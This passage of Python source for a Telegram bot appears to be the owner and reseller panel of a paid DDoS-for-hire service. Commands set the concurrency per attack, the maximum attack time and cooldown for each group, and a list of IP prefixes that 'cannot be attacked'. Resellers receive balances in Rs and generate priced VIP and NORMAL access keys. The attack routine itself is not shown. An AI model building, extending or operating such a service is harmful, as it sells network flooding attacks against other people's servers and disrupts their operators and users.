            bot.reply_to(message, f"{pe('cross','❌')} Fᴀɪʟᴇᴅ ᴛᴏ ᴀᴅᴅ ʙᴏᴛ: {result}", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!\n\nUsᴇ /addbot ᴛᴏ ᴛʀʏ ᴀɢᴀɪɴ.", parse_mode="HTML")

def process_del_bot(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Oᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    bot_input = message.text.strip()
    success, result = delete_bot(bot_input)
    
    if success:
        bot.reply_to(message, f"{pe('check','✅')} Bᴏᴛ ᴅᴇʟᴇᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜰᴜʟʟʏ!", parse_mode="HTML")
    else:
        bot.reply_to(message, f"{pe('cross','❌')} {result}", parse_mode="HTML")

# ============ LOAD SAVED SETTINGS ============
saved_max_slots = get_setting('max_concurrent_slots', 4)
current_max_slots = saved_max_slots
current_concurrent_value = get_setting('concurrent_per_attack', 4)

# Load all bots
load_all_bots()

# ============ CONVENIENCE COMMANDS ============

@bot.message_handler(commands=["setconcurrent"])
def set_concurrent_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{pe('warning','⚠️')} Usᴀɢᴇ: /setconcurrent <ᴠᴀʟᴜᴇ>\n\nExᴀᴍᴘʟᴇ: /setconcurrent 4\n\nTʜɪꜱ ꜱᴇᴛꜱ ʜᴏᴡ ᴍᴀɴʏ ᴄᴏɴᴄᴜʀʀᴇɴᴛ ᴄᴏɴɴᴇᴄᴛɪᴏɴꜱ ᴇᴀᴄʜ API ᴄᴀʟʟ ᴜꜱᴇꜱ.", parse_mode="HTML")
        return
    
    try:
        value = int(command_parts[1])
        if value < 1:
            value = 1
        if value > 50:
            value = 50
        
        set_concurrent_limit(value)
        bot.reply_to(message, f"{pe('check','✅')} Cᴏɴᴄᴜʀʀᴇɴᴛ ᴘᴇʀ ᴀᴛᴛᴀᴄᴋ ꜱᴇᴛ ᴛᴏ: {value}\n\nEᴀᴄʜ API ᴄᴀʟʟ ᴡɪʟʟ ᴜꜱᴇ {value} ᴄᴏɴᴄᴜʀʀᴇɴᴛ ᴄᴏɴɴᴇᴄᴛɪᴏɴꜱ.", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ! Usᴇ: /setconcurrent <ᴠᴀʟᴜᴇ>", parse_mode="HTML")

@bot.message_handler(commands=["setgrp"])
def set_group_config_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{pe('warning','⚠️')} Usᴀɢᴇ: /setgrp <ɢʀᴏᴜᴘ_ɪᴅ> <ꜱᴇᴛᴛɪɴɢ> <ᴠᴀʟᴜᴇ>\n\nSᴇᴛᴛɪɴɢꜱ: max_time, cooldown, max_slots, feedback\n\nExᴀᴍᴘʟᴇ: /setgrp -100123456789 max_time 300", parse_mode="HTML")
        return
    
    group_id = command_parts[1]
    setting = command_parts[2].lower()
    
    try:
        value = int(command_parts[3])
    except:
        if setting == "feedback":
            value_str = command_parts[3].lower()
            if value_str == "on":
                set_group_feedback_required(group_id, True)
                bot.reply_to(message, f"{pe('check','✅')} Gʀᴏᴜᴘ {group_id} ꜰᴇᴇᴅʙᴀᴄᴋ ʀᴇQᴜɪʀᴇᴅ ꜱᴇᴛ ᴛᴏ ON!", parse_mode="HTML")
            elif value_str == "of":
                set_group_feedback_required(group_id, False)
                bot.reply_to(message, f"{pe('check','✅')} Gʀᴏᴜᴘ {group_id} ꜰᴇᴇᴅʙᴀᴄᴋ ʀᴇQᴜɪʀᴇᴅ ꜱᴇᴛ ᴛᴏ OFF!", parse_mode="HTML")
            else:
                bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴠᴀʟᴜᴇ! Usᴇ 'on' ᴏʀ 'off' ꜰᴏʀ ꜰᴇᴇᴅʙᴀᴄᴋ.", parse_mode="HTML")
            return
        else:
            bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴠᴀʟᴜᴇ! Mᴜꜱᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ.", parse_mode="HTML")
            return
    
    if setting == "max_time":
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"{pe('cross','❌')} Mᴀx ᴛɪᴍᴇ ᴍᴜꜱᴛ ʙᴇ ᴀᴛ ʟᴇᴀꜱᴛ {MIN_ATTACK_TIME} ꜱᴇᴄᴏɴᴅꜱ!", parse_mode="HTML")
            return
        set_group_max_attack_time(group_id, value)
        bot.reply_to(message, f"{pe('check','✅')} Gʀᴏᴜᴘ {group_id} ᴍᴀx ᴀᴛᴛᴀᴄᴋ ᴛɪᴍᴇ ꜱᴇᴛ ᴛᴏ {value} ꜱᴇᴄᴏɴᴅꜱ!", parse_mode="HTML")
        
    elif setting == "cooldown":
        if value < 0:
            bot.reply_to(message, f"{pe('cross','❌')} Cᴏᴏʟᴅᴏᴡɴ ᴄᴀɴɴᴏᴛ ʙᴇ ɴᴇɢᴀᴛɪᴠᴇ!", parse_mode="HTML")
            return
        set_group_cooldown_time(group_id, value)
        bot.reply_to(message, f"{pe('check','✅')} Gʀᴏᴜᴘ {group_id} ᴄᴏᴏʟᴅᴏᴡɴ ꜱᴇᴛ ᴛᴏ {value} ꜱᴇᴄᴏɴᴅꜱ!", parse_mode="HTML")
        
    elif setting == "max_slots":
        if value < 1 or value > 50:
            bot.reply_to(message, f"{pe('cross','❌')} Mᴀx ꜱʟᴏᴛꜱ ᴍᴜꜱᴛ ʙᴇ ʙᴇᴛᴡᴇᴇɴ 1 ᴀɴᴅ 50!", parse_mode="HTML")
            return
        set_group_max_slots(group_id, value)
        bot.reply_to(message, f"{pe('check','✅')} Gʀᴏᴜᴘ {group_id} ᴍᴀx ꜱʟᴏᴛꜱ ꜱᴇᴛ ᴛᴏ {value}!", parse_mode="HTML")
        
    else:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ꜱᴇᴛᴛɪɴɢ! Usᴇ: max_time, cooldown, max_slots, feedback", parse_mode="HTML")

@bot.message_handler(commands=["blockip"])
def block_ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /blockip <ɪᴘ_ᴘʀᴇꜰɪx>\n\nExᴀᴍᴘʟᴇ: /blockip 20.204\n\nTʜɪꜱ ʙʟᴏᴄᴋꜱ ᴀʟʟ IPꜱ ꜱᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ 20.204", reply_to=message, parse_mode="HTML")
        return
    
    ip_prefix = command_parts[1]
    
    if add_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"{pe('check','✅')} IP ᴘʀᴇꜰɪx <code>{ip_prefix}*</code> ʜᴀꜱ ʙᴇᴇɴ ʙʟᴏᴄᴋᴇᴅ!\n\nAɴʏ IP ꜱᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ {ip_prefix} ᴄᴀɴɴᴏᴛ ʙᴇ ᴀᴛᴛᴀᴄᴋᴇᴅ.", reply_to=message, parse_mode="HTML")
    else:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Fᴀɪʟᴇᴅ ᴛᴏ ʙʟᴏᴄᴋ IP!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["unblockip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /unblockip <ɪᴘ_ᴘʀᴇꜰɪx>\n\nExᴀᴍᴘʟᴇ: /unblockip 20.204", reply_to=message, parse_mode="HTML")
        return
    
    ip_prefix = command_parts[1]
    
    if remove_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"{pe('check','✅')} IP ᴘʀᴇꜰɪx <code>{ip_prefix}*</code> ʜᴀꜱ ʙᴇᴇɴ ᴜɴʙʟᴏᴄᴋᴇᴅ!", reply_to=message, parse_mode="HTML")
    else:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} IP ᴘʀᴇꜰɪx <code>{ip_prefix}*</code> ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ʙʟᴏᴄᴋᴇᴅ ʟɪꜱᴛ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["blockedips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    blocked = get_all_blocked_ips()
    
    if not blocked:
        safe_send_message(message.chat.id, "📋 Nᴏ IPꜱ ᴀʀᴇ ᴄᴜʀʀᴇɴᴛʟʏ ʙʟᴏᴄᴋᴇᴅ!", reply_to=message)
        return
    
    response = f"{pe('warning','🚫')} <b>Bʟᴏᴄᴋᴇᴅ IPꜱ Lɪꜱᴛ</b>\n\n"
    for i, ip_data in enumerate(blocked, 1):
        response += f"{i}. <code>{ip_data['ip']}*</code>\n"
    
    response += f"\n{pe('chart','📊')} Tᴏᴛᴀʟ Bʟᴏᴄᴋᴇᴅ Pʀᴇꜰɪxᴇꜱ: {len(blocked)}"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["add_reseller", "addreseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /add_reseller <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ! Aꜱᴋ ᴛʜᴇᴍ ᴛᴏ ᴜꜱᴇ /id ᴄᴏᴍᴍᴀɴᴅ ꜰɪʀꜱᴛ.", reply_to=message, parse_mode="HTML")
        return
    
    existing = resellers_collection.find_one({'user_id': reseller_id})
    if existing:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴜꜱᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ᴀ ʀᴇꜱᴇʟʟᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    reseller_doc = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }
    
    resellers_collection.insert_one(reseller_doc)
    
    try:
        bot.send_message(reseller_id, f"{pe('congrats','🎉')} Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴꜱ! Yᴏᴜ ᴀʀᴇ ɴᴏᴡ ᴀ Rᴇꜱᴇʟʟᴇʀ!\n\n{pe('money','💰')} Usᴇ /mysaldo ᴛᴏ ᴄʜᴇᴄᴋ ʙᴀʟᴀɴᴄᴇ\n{pe('lock','🔑')} Usᴇ /gen ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴋᴇʏꜱ\n{pe('money','💵')} Usᴇ /prices ᴛᴏ ꜱᴇᴇ ᴘʀɪᴄɪɴɢ", parse_mode="HTML")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{pe('check','✅')} Rᴇꜱᴇʟʟᴇʀ ᴀᴅᴅᴇᴅ!\n\n{pe('profile','👤')} Usᴇʀ: {display}\n{pe('profile','🆔')} ID: {reseller_id}\n{pe('money','💰')} Bᴀʟᴀɴᴄᴇ: 0 Rꜱ", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["remove_reseller", "removereseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /remove_reseller <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    result = resellers_collection.delete_one({'user_id': reseller_id})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.deleted_count > 0:
        safe_send_message(message.chat.id, f"{pe('check','✅')} Rᴇꜱᴇʟʟᴇʀ {display} ʀᴇᴍᴏᴠᴇᴅ!", reply_to=message, parse_mode="HTML")
    else:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Rᴇꜱᴇʟʟᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["block_reseller", "blockreseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /block_reseller <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': True}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"{pe('ban','🚫')} Rᴇꜱᴇʟʟᴇʀ {display} ʙʟᴏᴄᴋᴇᴅ!", reply_to=message, parse_mode="HTML")
    else:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Rᴇꜱᴇʟʟᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ ᴏʀ ᴀʟʀᴇᴀᴅʏ ʙʟᴏᴄᴋᴇᴅ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["unblock_reseller", "unblockreseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /unblock_reseller <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': False}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"{pe('check','✅')} Rᴇꜱᴇʟʟᴇʀ {display} ᴜɴʙʟᴏᴄᴋᴇᴅ!", reply_to=message, parse_mode="HTML")
    else:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Rᴇꜱᴇʟʟᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["all_resellers", "allresellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    resellers = list(resellers_collection.find())
    
    if not resellers:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Nᴏ ʀᴇꜱᴇʟʟᴇʀꜱ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    response = "═══════════════════════════\n"
    response += f"{pe('briefcase','👥')} Rᴇꜱᴇʟʟᴇʀ Lɪꜱᴛ\n"
    response += "═══════════════════════════\n\n"
    
    active_resellers = [r for r in resellers if not r.get('blocked')]
    blocked_resellers = [r for r in resellers if r.get('blocked')]
    
    response += f"{pe('check','🟢')} Aᴄᴛɪᴠᴇ: {len(active_resellers)}\n"
    response += "───────────────────────────\n"
    
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. {pe('profile','👤')} <code>{r['user_id']}</code>\n"
        response += f"   {pe('money','💵')} Bᴀʟᴀɴᴄᴇ: {r.get('balance', 0)} Rꜱ\n"
        response += f"   {pe('lock','🔑')} Kᴇʏꜱ: {r.get('total_keys_generated', 0)}\n\n"
    
    if blocked_resellers:
        response += f"{pe('ban','🔴')} Bʟᴏᴄᴋᴇᴅ: {len(blocked_resellers)}\n"
        response += "───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. {pe('profile','👤')} <code>{r['user_id']}</code>\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["saldoadd"])
def saldo_add_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /saldoadd <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ> <ᴀᴍᴏᴜɴᴛ>", reply_to=message, parse_mode="HTML")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴀᴍᴏᴜɴᴛ!", reply_to=message, parse_mode="HTML")
        return
    
    if amount <= 0:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Aᴍᴏᴜɴᴛ ᴍᴜꜱᴛ ʙᴇ ᴘᴏꜱɪᴛɪᴠᴇ!", reply_to=message, parse_mode="HTML")
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Rᴇꜱᴇʟʟᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    new_balance = reseller.get('balance', 0) + amount
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    try:
        bot.send_message(reseller_id, f"{pe('money','💰')} Bᴀʟᴀɴᴄᴇ Aᴅᴅᴇᴅ!\n\n{pe('plus','➕')} Aᴅᴅᴇᴅ: {amount} Rꜱ\n{pe('money','💵')} Nᴇᴡ Bᴀʟᴀɴᴄᴇ: {new_balance} Rꜱ", parse_mode="HTML")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{pe('check','✅')} Bᴀʟᴀɴᴄᴇ Aᴅᴅᴇᴅ!\n\n{pe('profile','👤')} Rᴇꜱᴇʟʟᴇʀ: {display}\n{pe('profile','🆔')} ID: {reseller_id}\n{pe('plus','➕')} Aᴅᴅᴇᴅ: {amount} Rꜱ\n{pe('money','💵')} Nᴇᴡ Bᴀʟᴀɴᴄᴇ: {new_balance} Rꜱ", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["saldoremove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /saldoremove <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ> <ᴀᴍᴏᴜɴᴛ>", reply_to=message, parse_mode="HTML")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴀᴍᴏᴜɴᴛ!", reply_to=message, parse_mode="HTML")
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Rᴇꜱᴇʟʟᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    new_balance = max(0, reseller.get('balance', 0) - amount)
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{pe('check','✅')} Bᴀʟᴀɴᴄᴇ Rᴇᴍᴏᴠᴇᴅ!\n\n{pe('profile','👤')} Rᴇꜱᴇʟʟᴇʀ: {display}\n{pe('profile','🆔')} ID: {reseller_id}\n{pe('cancel','➖')} Rᴇᴍᴏᴠᴇᴅ: {amount} Rꜱ\n{pe('money','💵')} Nᴇᴡ Bᴀʟᴀɴᴄᴇ: {new_balance} Rꜱ", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /saldo <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Rᴇꜱᴇʟʟᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"{pe('money','💰')} Rᴇꜱᴇʟʟᴇʀ Bᴀʟᴀɴᴄᴇ\n\n{pe('profile','👤')} Usᴇʀ: {display}\n{pe('profile','🆔')} ID: {reseller_id}\n{pe('money','💵')} Bᴀʟᴀɴᴄᴇ: {reseller.get('balance', 0)} Rꜱ\n{pe('lock','🔑')} Tᴏᴛᴀʟ Kᴇʏꜱ: {reseller.get('total_keys_generated', 0)}\n{pe('chart','📊')} Sᴛᴀᴛᴜꜱ: {'🚫 Bʟᴏᴄᴋᴇᴅ' if reseller.get('blocked') else '✅ Aᴄᴛɪᴠᴇ'}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    if not reseller:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀ ʀᴇꜱᴇʟʟᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    if reseller.get('blocked'):
        safe_send_message(message.chat.id, f"{pe('ban','🚫')} Yᴏᴜʀ ᴘᴀɴᴇʟ ɪꜱ ʙʟᴏᴄᴋᴇᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    safe_send_message(message.chat.id, f"{pe('money','💰')} Yᴏᴜʀ Bᴀʟᴀɴᴄᴇ\n\n{pe('money','💵')} Bᴀʟᴀɴᴄᴇ: {reseller.get('balance', 0)} Rꜱ\n{pe('lock','🔑')} Tᴏᴛᴀʟ Kᴇʏꜱ Gᴇɴᴇʀᴀᴛᴇᴅ: {reseller.get('total_keys_generated', 0)}\n\n{pe('chart','📋')} Usᴇ /prices ᴛᴏ ꜱᴇᴇ ᴋᴇʏ ᴘʀɪᴄᴇꜱ\n{pe('lock','🔑')} Usᴇ /gen ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴋᴇʏꜱ", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ɪꜱ ꜰᴏʀ ʀᴇꜱᴇʟʟᴇʀꜱ ᴏɴʟʏ!", reply_to=message, parse_mode="HTML")
        return
    
    response = "═══════════════════════════\n"
    response += f"{pe('money','💵')} Kᴇʏ Pʀɪᴄɪɴɢ\n"
    response += "═══════════════════════════\n\n"
    
    response += f"{pe('star','⭐')} VIP Kᴇʏꜱ:\n"
    for dur, label in DURATION_LABELS.items():
        price = get_key_price('VIP', dur)
        if price > 0:
            response += f"   {label:<12} ➜  {price} Rꜱ\n"
    
    response += f"\n{pe('star','📀')} NORMAL Kᴇʏꜱ:\n"
    for dur, label in DURATION_LABELS.items():
        price = get_key_price('NORMAL', dur)
        if price > 0:
